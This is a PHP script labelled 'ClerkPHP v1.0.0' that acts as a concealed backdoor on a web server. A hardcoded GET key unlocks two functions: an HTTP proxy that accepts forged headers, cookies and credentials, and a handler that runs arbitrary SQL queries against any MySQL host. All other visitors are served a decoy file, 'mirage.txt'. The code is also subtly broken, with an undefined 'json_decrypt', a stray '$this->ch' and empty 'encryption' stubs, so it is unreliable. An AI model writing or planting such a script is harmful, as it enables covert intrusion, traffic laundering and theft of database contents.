<?php
  //ClerkPHP v1.0.0
  $main_key=array(
    'alias'=>'key',
    'content'=>'qwerty123456'
  );
  $key=array(
    'proxy'=>'proxy',
    'config'=>'config',
    'dbact'=>'dbact'
  );
  $ver='1.0.0';
  function encryptor($data){
    //decryption code
    return $data;
  }
  function decryptor($data){
    //encryption code
    return $data;
  }
  if(isset($_GET[$main_key['alias']])){
    if(decryptor($_GET[$main_key['alias']])==$main_key['content']){
      if(isset($_GET[$key['proxy']])){
        //ClerkPHP v1.0.0
        $data=$_GET[$key['proxy']];
        $data=json_decrypt(decryptor($data));
        $url=$data['url'].$data['path'];
        if($data['get']){
          $url.='?'.http_build_query($data['get']);
        }
        $request_settings=array(
          CURLOPT_HEADER => 0,
          CURLOPT_URL => $url,
          CURLOPT_RETURNTRANSFER => 1,
          CURLOPT_TIMEOUT => 4
        );
        if($data['post']){
          $request_settings[CURLOPT_FRESH_CONNECT]=1;
          $request_settings[CURLOPT_FORBID_REUSE]=1;
          $request_settings[CURLOPT_POST]=1;
          $request_settings[CURLOPT_POSTFIELDS]=http_build_query($data['post']);
        }
        if($data['head-only']){
          $request_settings[CURLOPT_NOBODY]=1;
        }
        if($data['referer']){
          $request_settings[CURLOPT_REFERER]=$data['referer'];
        }
        if($data['header']){
          if($data['host']){
            $data['header']=array_merge(
              array('Host: '.$data['host']),
              $data['header']
            );
          }
          $request_settings[CURLOPT_HTTPHEADER]=$data['header'];
        }
        if($data['user-agent']){
          $request_settings[CURLOPT_USERAGENT]=$data['user-agent'];
        }
        if($data['cookie']){
          $request_settings[CURLOPT_COOKIE]=http_build_query($data['cookie']);
        }
        if($data['autherization']){
          $request_settings[CURLOPT_USERPWD]=$data['autherization'];
        }
        if($data['follow']){
          $request_settings[CURLOPT_FOLLOWLOCATION]=1;
        }
        if($data['ssl']){
          $request_settings[CURLOPT_SSL_VERIFYHOST]=1;
          $request_settings[CURLOPT_SSL_VERIFYPEER]=1;
        }else{
          $request_settings[CURLOPT_SSL_VERIFYHOST]=0;
          $request_settings[CURLOPT_SSL_VERIFYPEER]=0;
        }
        $connect=curl_init();
        curl_setopt_array($connect, $request_settings);
        $response = curl_exec($this->ch);
        $header_length = curl_getinfo($connect,CURLINFO_HEADER_SIZE);
        $result=array(
          'code'=>curl_getinfo($connect, CURLINFO_HTTP_CODE),
          'error'=>curl_error($connect),
          'header'=>substr($response, 0, $header_length),
          'body'=>substr($response, $header_length),
          'last_url'=>curl_getinfo($connect ,CURLINFO_EFFECTIVE_URL)
        );
        curl_close($connect);
        echo encryptor(json_encode($result));
        die();
      }elseif(isset($_GET[$key['dbact']])){
        $data=$_GET[$key['dbact']];
        $data=json_decrypt(decryptor($data));
        $result=array(
          'error'=>array(),
          'output'=>array()
        );
        $conn=mysqli_connect($data['host'],$data['user'],$data['password'],$data['database']);
        for($i=0;$i<count($data['queries']);$i++){
      		if(mysqli_connect_errno()){
      			$result['error'][$i]=true;
            $result['output'][$i]=null;
            continue;
      		}else{
            $result['error'][$i]=false;
          }
      		$tmp_result=mysqli_query($conn, $data['queries'][$i]);
      		$ret=array();
      		while($row=mysqli_fetch_assoc($tmp_result)){
      			$ret[]=$row;
      		}
          $result['output'][$i]=$ret;
        }
        $conn->close();
        echo encryptor(json_encode($result));
        die();
        //ClerkPHP v1.0.0
      }elseif(isset($_GET[$key['config']])){
        $data=$_GET[$key['config']];
        $data=json_decrypt(decryptor($data));
        $result=array('note'=>'currently not supported');
        echo encryptor(json_encode($result));
        die();
      }else{
        include 'mirage.txt';
      }
    }else{
      include 'mirage.txt';
    }
  }else{
    include 'mirage.txt';
  }
  //ClerkPHP v1.0.0
?>
